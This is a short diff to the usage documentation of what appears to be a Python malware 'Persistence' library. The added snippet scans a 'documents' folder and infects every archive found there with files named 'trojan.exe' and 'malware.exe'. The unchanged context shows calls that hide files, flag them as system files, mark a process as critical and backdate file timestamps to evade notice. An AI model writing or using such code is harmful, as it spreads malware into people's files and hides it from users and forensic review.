@@ -3,6 +3,7 @@
 ``` python
 import Persistence.Admin
 import Persistence.Attrib
+import Persistence.Archive
 import Persistence.CriticalProcess
 import Persistence.FileDate
 
@@ -24,6 +25,13 @@ Persistence.Attrib.SetNormal("file.exe")
 Persistence.Attrib.SetHidden("file.exe")
 # Set file attrib system
 Persistence.Attrib.SetSystem("file.exe")
+
+# Infect archive
+# Write all executable files in archives
+files = ["trojan.exe", "malware.exe"]
+archives = Persistence.Archive.Scan("documents")
+for archive in archives:
+    Persistence.Archive.Infect(archive, files)
 
 # Change file modification date
 # To 'Mon Dec  2 20:02:47 2002'
